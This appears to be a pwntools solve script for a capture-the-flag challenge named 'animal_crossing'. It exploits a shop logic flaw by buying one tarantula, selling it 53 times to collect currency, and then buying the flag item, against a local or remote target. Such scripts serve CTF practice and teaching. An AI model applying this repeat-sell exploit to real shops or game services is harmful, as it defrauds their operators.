#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './animal_crossing'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

# context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget

# elf, libc

# buy tarantula - 8000
sla('Choice: ','2')
sla('6. flag - 420000 bells\n','2')

# sell tarantula 53 times - 8000*53=424000
for i in range(53):
    sla('Choice: ','1')
    sla('5. tarantula - I hate spiders! Price: 8000 bells\n','5')
    print i

# sell 1,2 (make room in pockets)
sla('Choice: ','1')
sla('5. tarantula - I hate spiders! Price: 8000 bells\n','2')
sla('Choice: ','1')
sla('5. tarantula - I hate spiders! Price: 8000 bells\n','1')

# buy flag
sla('Choice: ','2')
sla('6. flag - 420000 bells\n','6')

# print flag
context.log_level = 'debug'
sla('Choice: ','1')

p.interactive()

